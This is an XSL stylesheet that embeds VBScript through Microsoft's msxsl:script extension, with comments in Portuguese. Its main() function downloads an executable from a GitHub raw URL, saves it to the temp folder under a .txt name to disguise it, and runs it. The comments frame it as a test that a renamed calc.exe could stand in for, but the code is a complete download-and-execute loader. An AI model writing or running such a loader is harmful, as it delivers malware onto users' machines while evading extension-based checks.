<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:ms="urn:schemas-microsoft-com:xslt"
    xmlns:user="https://example.com/script">

  <ms:script language="VBScript" implements-prefix="user">
    <![CDATA[
      Function main( )
        Dim objShell
        Dim objHTTP
        Dim objStream
        Dim strURL
        Dim strFilePath
        Dim strTempDir

        ' URL do binário a ser baixado (substitua por um URL de teste seguro)
        strURL = "https://github.com/fonfon08/mystuffzx/raw/refs/heads/main/exelon.exe" ' Ex: um calc.exe renomeado

        ' Obter o diretório temporário do sistema
        Set objShell = CreateObject("WScript.Shell" )
        strTempDir = objShell.ExpandEnvironmentStrings("%TEMP%")

        ' Caminho completo para salvar o binário com extensão "morta"
        strFilePath = strTempDir & "\payload.txt" ' Salva como .txt

        ' Baixar o binário
        Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
        objHTTP.open "GET", strURL, False
        objHTTP.send

        ' Salvar o binário no arquivo temporário
        Set objStream = CreateObject("ADODB.Stream")
        objStream.Open
        objStream.Type = 1 ' adTypeBinary
        objStream.Write objHTTP.responseBody
        objStream.SaveToFile strFilePath, 2 ' adSaveCreateOverWrite
        objStream.Close

        ' Executar o binário salvo
        ' Mesmo com a extensão .txt, o WScript.Shell.Run pode executá-lo se for um PE válido
        objShell.Run strFilePath, 1, True ' 0 para ocultar janela, True para esperar terminar

        Set objShell = Nothing
        Set objHTTP = Nothing
        Set objStream = Nothing
      End Function
    ]]>
  </ms:script>

  <xsl:template match="/">
    <xsl:value-of select="user:main()"/>
  </xsl:template>

</xsl:stylesheet>
